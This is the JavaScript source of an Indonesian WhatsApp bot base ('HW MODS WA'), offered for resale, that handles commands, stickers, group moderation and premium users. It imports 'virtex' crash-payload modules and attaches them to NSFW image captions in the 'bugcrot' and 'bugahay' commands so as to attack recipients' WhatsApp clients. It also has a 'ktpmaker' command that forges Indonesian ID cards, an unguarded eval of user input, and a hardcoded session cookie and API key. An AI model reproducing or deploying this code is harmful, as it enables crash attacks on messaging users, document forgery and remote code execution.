/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base HW MODS WA

› Create By HW MODS WA
› Base Ori HW MODS WA - Haikal

🌷 KALAU MAU RENAME TARO CREDITS GUA : HW MODS WA*/

//=================================================//
require('./hwkal')
require('./baseikal/lib/funclist')
const { WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const vm = require('node:vm')
const mel = require('kitsune-api')
const axios = require('axios')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const maker = require('mumaker')
const { uptotelegra } = require('./baseikal/lib/upload')
const textpro = require('./baseikal/lib/textpro')
const fsx = require('fs-extra')
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./baseikal/lib/list')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
//=================================================//

// COMMAND GUA SULITIN
const { menu } = require('./baseikal/command/menu/menu')
const { allmenu } = require('./baseikal/command/allmenu/allmenu')
const { textmaker } = require('./baseikal/command/textmaker/textmaker')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const kalimage = fs.readFileSync ('./baseikal/image/mamak.jpg')
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const dblist = JSON.parse(fs.readFileSync('./database/listall.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
var chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = haikal.user.id ? haikal.user.id.split(":")[0]+"@s.whatsapp.net" : haikal.user.id
const isCreator = [haikal.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
const content = JSON.stringify(m.message)
const isPrem = prem.includes(sender)
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isDocu = (type == 'documentMessage')
const isSticker = (type == 'stickerMessage')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
//=================================================//
const deploy = (teks) => {
  haikal.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/7b3c0ac03dab420c5c12b.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m})} 
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
haikal.sendPresenceUpdate(jd, from)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName), 'args :', chalk.green(text.length))
 }
//=================================================// 
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`「 Detect Link 」\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `「 Detect Link 」\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (!isBotAdmins) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(from, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
    
if (budy.startsWith('©️')) {
if (!isPrem) return replyprem(mess.premium)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
const sendapk = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yoapk Haikal')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yozip Haikal')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yopdf Haikal')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
haikal.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
if (!isCmd && m.isGroup && isAlreadyResponList(from, chath, db_respon_list)) {
var get_data_respon = getDataResponList(from, chath, db_respon_list)
if (get_data_respon.isImage === false) {
haikal.sendMessage(from, { text: sendResponList(from, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
haikal.sendImage(from, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyhaikalList(chath, dblist)) {
var getkaydata = getDatahaikalList(chath, dblist)
if (getkaydata.isImage === false) {
haikal.sendMessage(from, { text: sendhaikalList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getkaydata.image_url)
haikal.sendImage(from, buff, `${getkaydata.response}`, m)
}
}

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await haikal.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
async function tiktokdl(url) {
    try {
const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
let a = cheerio.load(tokenn.data);
let token = a("#token").attr("value");
const param = {
    url: url,
    token: token,
};
const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
method: "post",
data: new URLSearchParams(Object.entries(param)),
headers: {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
},
    }
);
return {
    status: 200,
    title: data.title,
    thumbnail: data.thumbnail,
    duration: data.duration,
    media: data.medias,
};
    } catch (e) {
return e
    }
}
async function replyprem(teks) {
    let buttons = [
    { buttonId: '.buypremium', buttonText: { displayText: '⬆️ Upgrade Premium' }, type: 1 }
    ]
    return haikal.sendButtonText(from, buttons, teks, `Developer Hw Mods`, m)
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}
//LOGO MENTAHAN
const hw1 = fs.readFileSync ('./baseikal/logo/hw1.jpg')
const hw2 = fs.readFileSync ('./baseikal/logo/hw2.jpg')
const hw3 = fs.readFileSync ('./baseikal/logo/hw3.jpg')
const hw4 = fs.readFileSync ('./baseikal/logo/hw4.jpg')
const hw5 = fs.readFileSync ('./baseikal/logo/hw5.jpg')
const hw6 = fs.readFileSync ('./baseikal/logo/hw6.jpg')
const hw7 = fs.readFileSync ('./baseikal/logo/hw7.jpg')
const hw8 = fs.readFileSync ('./baseikal/logo/hw8.jpg')
const hw9 = fs.readFileSync ('./baseikal/logo/hw9.jpg')
const hw10 = fs.readFileSync ('./baseikal/logo/hw10.jpg')
const hw11 = fs.readFileSync ('./baseikal/logo/hw11.jpg')
const hw12 = fs.readFileSync ('./baseikal/logo/hw12.jpg')
const hw13 = fs.readFileSync ('./baseikal/logo/hw13.jpg')
const hw14 = fs.readFileSync ('./baseikal/logo/hw14.jpg')
const hw15 = fs.readFileSync ('./baseikal/logo/hw15.jpg')
const hw16 = fs.readFileSync ('./baseikal/logo/hw16.jpg')
const hw17 = fs.readFileSync ('./baseikal/logo/hw17.jpg')
const hw18 = fs.readFileSync ('./baseikal/logo/hw18.jpg')
const hw19 = fs.readFileSync ('./baseikal/logo/hw19.jpg')
const hw20 = fs.readFileSync ('./baseikal/logo/hw20.jpg')
const hw21 = fs.readFileSync ('./baseikal/logo/hw21.jpg')
const hw22 = fs.readFileSync ('./baseikal/logo/hw22.jpg')
const hw23 = fs.readFileSync ('./baseikal/logo/hw23.jpg')
const hw24 = fs.readFileSync ('./baseikal/logo/hw24.jpg')
const hw25 = fs.readFileSync ('./baseikal/logo/hw25.jpg')
const hw26 = fs.readFileSync ('./baseikal/logo/hw26.jpg')
const hw27 = fs.readFileSync ('./baseikal/logo/hw27.jpg')
const hw28 = fs.readFileSync ('./baseikal/logo/hw28.jpg')
const hw29 = fs.readFileSync ('./baseikal/logo/hw29.jpg')
const hw30 = fs.readFileSync ('./baseikal/logo/hw30.jpg')
const hw31 = fs.readFileSync ('./baseikal/logo/hw31.jpg')
const hw32 = fs.readFileSync ('./baseikal/logo/hw32.jpg')
const hw33 = fs.readFileSync ('./baseikal/logo/hw33.jpg')
const hw34 = fs.readFileSync ('./baseikal/logo/hw34.jpg')
const hw35 = fs.readFileSync ('./baseikal/logo/hw35.jpg')
const hw36 = fs.readFileSync ('./baseikal/logo/hw36.jpg')
const hw37 = fs.readFileSync ('./baseikal/logo/hw37.jpg')
const hw38 = fs.readFileSync ('./baseikal/logo/hw38.jpg')
const hw39 = fs.readFileSync ('./baseikal/logo/hw39.jpg')
const hw40 = fs.readFileSync ('./baseikal/logo/hw40.jpg')
const hw41 = fs.readFileSync ('./baseikal/logo/hw41.jpg')
const hw42 = fs.readFileSync ('./baseikal/logo/hw42.jpg')
const hw43 = fs.readFileSync ('./baseikal/logo/hw43.jpg')
const hw44 = fs.readFileSync ('./baseikal/logo/hw44.jpg')
const hw45 = fs.readFileSync ('./baseikal/logo/hw45.jpg')
const hw46 = fs.readFileSync ('./baseikal/logo/hw46.jpg')
const hw47 = fs.readFileSync ('./baseikal/logo/hw47.jpg')
const hw48 = fs.readFileSync ('./baseikal/logo/hw48.jpg')
const hw49 = fs.readFileSync ('./baseikal/logo/hw49.jpg')
const hw50 = fs.readFileSync ('./baseikal/logo/hw50.jpg')
const hw51 = fs.readFileSync ('./baseikal/logo/hw51.jpg')
const hw52 = fs.readFileSync ('./baseikal/logo/hw52.jpg')
const hw53 = fs.readFileSync ('./baseikal/logo/hw53.jpg')
const hw54 = fs.readFileSync ('./baseikal/logo/hw54.jpg')
const hw55 = fs.readFileSync ('./baseikal/logo/hw55.jpg')
const hw56 = fs.readFileSync ('./baseikal/logo/hw56.jpg')
const hw57 = fs.readFileSync ('./baseikal/logo/hw57.jpg')
const hw58 = fs.readFileSync ('./baseikal/logo/hw58.jpg')
const hw59 = fs.readFileSync ('./baseikal/logo/hw59.jpg')
const hw60 = fs.readFileSync ('./baseikal/logo/hw60.jpg')
const hw61 = fs.readFileSync ('./baseikal/logo/hw61.jpg')
const hw62 = fs.readFileSync ('./baseikal/logo/hw62.jpg')
const hw63 = fs.readFileSync ('./baseikal/logo/hw63.jpg')
const hw64 = fs.readFileSync ('./baseikal/logo/hw64.jpg')
const hw65 = fs.readFileSync ('./baseikal/logo/hw65.jpg')
const hw66 = fs.readFileSync ('./baseikal/logo/hw66.jpg')
const hw67 = fs.readFileSync ('./baseikal/logo/hw67.jpg')
const hw68 = fs.readFileSync ('./baseikal/logo/hw68.jpg')
const hw69 = fs.readFileSync ('./baseikal/logo/hw69.jpg')
const hw70 = fs.readFileSync ('./baseikal/logo/hw70.jpg')
const hw71 = fs.readFileSync ('./baseikal/logo/hw71.jpg')
const hw72 = fs.readFileSync ('./baseikal/logo/hw72.jpg')
const hw73 = fs.readFileSync ('./baseikal/logo/hw73.jpg')
const hw74 = fs.readFileSync ('./baseikal/logo/hw74.jpg')
const hw75 = fs.readFileSync ('./baseikal/logo/hw75.jpg')
const hw76 = fs.readFileSync ('./baseikal/logo/hw76.jpg')
const hw77 = fs.readFileSync ('./baseikal/logo/hw77.jpg')
const hw78 = fs.readFileSync ('./baseikal/logo/hw78.jpg')
const hw79 = fs.readFileSync ('./baseikal/logo/hw79.jpg')
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let setting = global.db.settings[botNumber]
if (typeof setting !== 'object') global.db.settings[botNumber] = {}
    if (setting) {
if (!('inod' in setting)) setting.inod = true
if (!('sura' in setting)) setting.sura = false
if (!('hwmods' in setting)) setting.hwmods = false
if (!('onkabeh' in setting)) setting.onkabeh = false
if (!('offkabeh' in setting)) setting.offkabeh = false
if (!('inod1' in setting)) setting.inod1 = true
if (!('sura1' in setting)) setting.sura1 = false
if (!('hwmods1' in setting)) setting.hwmods1 = false
if (!('onkabeh1' in setting)) setting.onkabeh1 = false
if (!('offkabeh1' in setting)) setting.offkabeh1 = false
	    } else global.db.settings[botNumber] = {
inod: true,
sura: false,
hwmods: false,
onkabeh: false,
offkabeh: false,
inod1: true,
sura1: false,
hwmods1: false,
onkabeh1: false,
offkabeh1: false,
	    }
} catch (err) {
console.log(err)
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//=================================================//
switch(command) {
//=================================================//
case 'nsfw': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

Ketik On Untuk Menyalakan Fitur Ini
Ketif Of Untuk Menon Aktifkan Fitur Ini

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
haikal.sendMessage(from, anuala, `HW MODS WA${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© HW MODS WA${buttonkal}`,
} 
haikal.sendMessage(from, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply('Sabar Cuy Loading')
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© HW MODS WA${buttonkal}`,
} 
haikal.sendMessage(from, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'ktpmaker': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return m.reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return m.reply('region belum ada')
until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
img = get_args[16]
if (!img) return m.reply('url image belum ada')
      m.reply('Sabar Cuy Loading')
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await haikal.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
sticSukses(from)
//await sleep(5000)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'emojimix': {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
